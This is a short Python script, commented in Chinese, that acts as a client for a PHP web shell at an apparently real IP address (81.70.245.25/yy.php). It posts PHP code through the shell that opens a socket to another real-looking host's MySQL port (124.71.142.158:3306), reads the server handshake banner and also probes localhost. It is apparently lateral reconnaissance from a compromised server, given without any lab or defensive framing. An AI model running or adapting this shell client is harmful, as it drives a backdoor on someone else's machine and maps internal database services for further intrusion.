#!/usr/bin/env python3
"""81.70 fsockopen 测试连 124.71:3306 (带输出缓冲刷新)"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=45):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# fsockopen + 读 banner (MySQL 握手包)
code = '''
$f=@fsockopen('124.71.142.158',3306,$e,$es,5);
if(!$f){print_r('CONN_FAIL:' . $es);}
else{
  stream_set_timeout($f,5);
  $h=fread($f,256);
  print_r('CONN_OK banner_len:' . strlen($h));
  if(strlen($h)>4){print_r(' proto:' . ord($h[0]) . ' ver:' . ord($h[1]));}
  fclose($f);
}
'''
r = cmd(code, 45)
print("fsockopen 124.71:3306:", r.strip()[-150:], flush=True)

# 同时测 165:3306 对比 (165 有 MySQL? 确认脚本是否正常输出)
code2 = '''
$f=@fsockopen('127.0.0.1',3306,$e,$es,3);
if(!$f){print_r('165_3306_CLOSED');}else{print_r('165_3306_OPEN');fclose($f);}
'''
r = cmd(code2, 30)
print("对比测试:", r.strip()[-80:], flush=True)
